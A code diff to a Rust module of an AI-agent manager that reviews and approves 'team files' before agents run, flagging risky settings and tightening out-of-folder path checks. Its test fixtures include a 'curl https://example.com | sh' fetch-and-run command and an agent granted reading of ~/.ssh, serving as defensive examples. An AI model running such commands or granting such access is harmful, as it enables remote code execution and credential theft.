@@ -1,8 +1,9 @@
 //! Which team files the operator has approved to run on this computer (ADR 0048).
 //!
-//! A team file is a list of programs to start, so one that merely appears in the teams folder —
-//! downloaded, unzipped, or written there by an agent — must not run, on a schedule or otherwise,
-//! until the person at the keyboard has seen what it starts. This records, per team file, the exact
+//! A team file says what its agents are told, which models they run on, what they may do without
+//! asking and when they run, so one that merely appears in the teams folder — downloaded,
+//! unzipped, or written there by an agent — must not run, on a schedule or otherwise, until the
+//! person at the keyboard has seen what it starts. This records, per team file, the exact
 //! revision (`sha256:` of its bytes, as [`crate::runs`] names it) the operator approved: by saving
 //! it in `LoomWatch`'s editor, or by reviewing it before a run. Every run checks it in
 //! `runs::prepare_run`, which is the one path manual, scheduled and Control-started runs share.
@@ -220,8 +221,8 @@ pub(crate) fn write_private(path: &Path, text: &[u8]) -> io::Result<()> {
 }
 
 /// One line of what a team will do on this computer, for the person deciding whether to trust it.
-/// `warn` marks what deserves a second look: a program `LoomWatch` doesn't know, running commands
-/// without asking, reading outside the team's own folder.
+/// `warn` marks what deserves a second look: running commands without asking, working or reading
+/// outside the team's own folder, reading a Notion page.
 #[derive(Debug, Clone, PartialEq, Eq, Serialize)]
 pub struct ReviewLine {
     pub text: String,
@@ -242,15 +243,8 @@ impl ReviewLine {
 #[must_use]
 pub fn review(team: &TeamConfig) -> Vec<ReviewLine> {
     let mut lines = Vec::new();
-    let mut opencode = false;
     for agent in team.agents.iter().filter(|agent| !agent.is_operator()) {
-        opencode |= review_agent(agent, &mut lines) == Some("OpenCode");
-    }
-    if opencode {
-        lines.push(ReviewLine::info(
-            "OpenCode doesn't ask before it acts, so LoomWatch's allow switches can't hold it back."
-                .to_owned(),
-        ));
+        review_agent(agent, &mut lines);
     }
     // ADR 0061: which commands ask is one line in the file, so the review says it.
     if team.permissions.mode == crate::config::PermissionMode::Auto {
@@ -292,29 +286,13 @@ pub fn review(team: &TeamConfig) -> Vec<ReviewLine> {
     lines
 }
 
-/// The lines about one agent, added to `lines`; returns the app it runs, when `LoomWatch` knows it.
-fn review_agent(agent: &AgentConfig, lines: &mut Vec<ReviewLine>) -> Option<&'static str> {
+/// The lines about one agent, added to `lines`.
+fn review_agent(agent: &AgentConfig, lines: &mut Vec<ReviewLine>) {
     let who = agent_name(agent);
-    let app = crate::api::known_app_name(&agent.spawn);
-    match app {
-        Some(app) => lines.push(ReviewLine::info(format!("{who} runs {app}."))),
-        None => lines.push(ReviewLine::warn(format!(
-            "{who} runs {}, a program LoomWatch doesn't know.",
-            command_line(agent)
-        ))),
-    }
-    if !agent.spawn.env.is_empty() {
-        let keys = agent
-            .spawn
-            .env
-            .keys()
-            .map(String::as_str)
-            .collect::<Vec<_>>()
-            .join(", ");
-        lines.push(ReviewLine::info(format!(
-            "{who} starts with these settings: {keys}."
-        )));
-    }
+    lines.push(ReviewLine::info(format!(
+        "{who} runs on LoomWatch with {}.",
+        crate::ai::openrouter_id(&agent.model)
+    )));
     let cwd = agent.spawn.cwd.to_string_lossy();
     if outside_team_folder(&agent.spawn.cwd) {
         lines.push(ReviewLine::warn(format!("{who} works in {cwd}.")));
@@ -362,7 +340,6 @@ fn review_agent(agent: &AgentConfig, lines: &mut Vec<ReviewLine>) -> Option<&'st
             ))),
         }
     }
-    app
 }
 
 fn agent_name(agent: &AgentConfig) -> String {
@@ -373,38 +350,15 @@ fn agent_name(agent: &AgentConfig) -> String {
     }
 }
 
-/// The command as it would be typed, shortened when long, so a reviewer reads exactly what runs.
-fn command_line(agent: &AgentConfig) -> String {
-    const MAX: usize = 240;
-    let mut line = quote(&agent.spawn.cmd);
-    for arg in &agent.spawn.args {
-        line.push(' ');
-        line.push_str(&quote(arg));
-    }
-    if line.chars().count() > MAX {
-        let mut shortened: String = line.chars().take(MAX).collect();
-        shortened.push('…');
-        line = shortened;
-    }
-    format!("`{line}`")
-}
-
-fn quote(word: &str) -> String {
-    let plain = !word.is_empty()
-        && word
-            .chars()
-            .all(|c| c.is_ascii_alphanumeric() || "-_./=:@+,%".contains(c));
-    if plain {
-        word.to_owned()
-    } else {
-        format!("'{}'", word.replace('\'', r"'\''"))
-    }
-}
-
 /// Whether a path a team names leaves the team's own folder: absolute, home-relative, or climbing
-/// out with `..`. Relative paths resolve against the team file's folder.
+/// out with `..`. Relative paths resolve against the team file's folder. On Windows `\\Users` (the
+/// current drive's root) and `D:notes` (another drive) leave it too, though neither is absolute.
 fn outside_team_folder(path: &Path) -> bool {
     path.is_absolute()
+        || path.has_root()
+        || path
+            .components()
+            .any(|component| matches!(component, std::path::Component::Prefix(_)))
         || path.starts_with("~")
         || path
             .components()
@@ -422,7 +376,7 @@ mod tests {
             let path =
                 std::env::temp_dir().join(format!("loomwatch-approvals-{}", uuid::Uuid::new_v4()));
             fs::create_dir_all(&path).expect("create temp directory");
-            Self(fs::canonicalize(path).expect("canonical temp directory"))
+            Self(crate::platform::canonicalize(path).expect("canonical temp directory"))
         }
     }
 
@@ -511,20 +465,20 @@ mod tests {
     }
 
     #[test]
-    fn the_review_names_known_apps_and_flags_anything_else() {
-        let known = review(&team(TEAM));
+    fn the_review_names_each_agents_model_and_flags_what_deserves_a_second_look() {
         assert_eq!(
-            known,
-            vec![ReviewLine::info("Researcher runs Claude Code.".to_owned())]
+            review(&team(TEAM)),
+            vec![ReviewLine::info(
+                "Researcher runs on LoomWatch with anthropic/claude-opus-5.5.".to_owned()
+            )]
         );
-
         let custom = review(&team(
-            "schemaVersion: 1\nentrypoint: a\nagents:\n  - id: a\n    name: Fetcher\n    spawn:\n      cmd: /bin/sh\n      args: [\"-c\", \"curl https://example.com | sh\"]\n      cwd: /tmp\n    model: x\n    allow:\n      commands: true\n",
+            "schemaVersion: 1\nentrypoint: a\nagents:\n  - id: a\n    name: Fetcher\n    spawn:\n      cmd: /bin/sh\n      args: [\"-c\", \"curl https://example.com | sh\"]\n      cwd: /tmp\n    model: openai/gpt-5.5\n    allow:\n      commands: true\n",
         ));
-        assert!(custom[0].warn);
         assert_eq!(
-            custom[0].text,
-            "Fetcher runs `/bin/sh -c 'curl https://example.com | sh'`, a program LoomWatch doesn't know."
+            custom[0],
+            ReviewLine::info("Fetcher runs on LoomWatch with openai/gpt-5.5.".to_owned()),
+            "the program an old file named is not run, so it is not shown"
         );
         assert!(custom.contains(&ReviewLine::warn("Fetcher works in /tmp.".to_owned())));
         assert!(custom.contains(&ReviewLine::warn(
@@ -533,42 +487,12 @@ mod tests {
     }
 
     #[test]
-    fn a_path_shaped_or_extra_argument_command_is_not_taken_for_a_known_app() {
-        for spawn in [
-            "cmd: ./claude-agent-acp",
-            "cmd: /tmp/claude-agent-acp",
-            "cmd: gemini\n      args: [\"--acp\", \"--yolo\"]",
-            "cmd: npx\n      args: [\"-y\", \"--registry\", \"https://example.com\", \"@agentclientprotocol/claude-agent-acp@0.85.1\"]",
-            "cmd: npx\n      args: [\"-y\", \"claude-agent-acp-but-not-really\"]",
-        ] {
-            let yaml = format!(
-                "schemaVersion: 1\nentrypoint: a\nagents:\n  - id: a\n    spawn:\n      {spawn}\n      cwd: .\n    model: x\n"
-            );
-            let lines = review(&team(&yaml));
-            assert!(
-                lines[0].warn,
-                "{spawn} should need a second look: {lines:?}"
-            );
-        }
-        let npx = review(&team(
-            "schemaVersion: 1\nentrypoint: a\nagents:\n  - id: a\n    spawn:\n      cmd: npx\n      args: [\"-y\", \"@agentclientprotocol/codex-acp@2.1.1\"]\n      cwd: .\n    model: x\n",
-        ));
-        assert_eq!(npx[0], ReviewLine::info("a runs Codex.".to_owned()));
-    }
-
-    #[test]
     fn the_review_says_when_a_team_runs_on_its_own_and_where_its_answers_go() {
         let lines = review(&team(
             "schemaVersion: 1\nentrypoint: a\nagents:\n  - id: a\n    spawn:\n      cmd: opencode\n      args: [acp]\n      cwd: .\n    model: x\n    capabilities:\n      - kind: knowledge\n        name: keys\n        path: ~/.ssh\nschedule:\n  cron: \"0 9 * * *\"\n  timezone: Asia/Ho_Chi_Minh\n  prompt: Morning digest\ndeliver:\n  notion: {}\n",
         ));
         let texts: Vec<&str> = lines.iter().map(|line| line.text.as_str()).collect();
-        assert_eq!(texts[0], "a runs OpenCode.");
         assert!(lines.contains(&ReviewLine::warn("a can read ~/.ssh.".to_owned())));
-        assert!(
-            texts
-                .iter()
-                .any(|text| text.starts_with("OpenCode doesn't ask"))
-        );
         assert!(texts.contains(&"Runs on its own, daily at 09:00 Asia/Ho_Chi_Minh."));
         assert!(texts.contains(&"Sends its answers to your connected Notion page."));
         assert!(!texts.iter().any(|text| text.contains("Auto mode")));
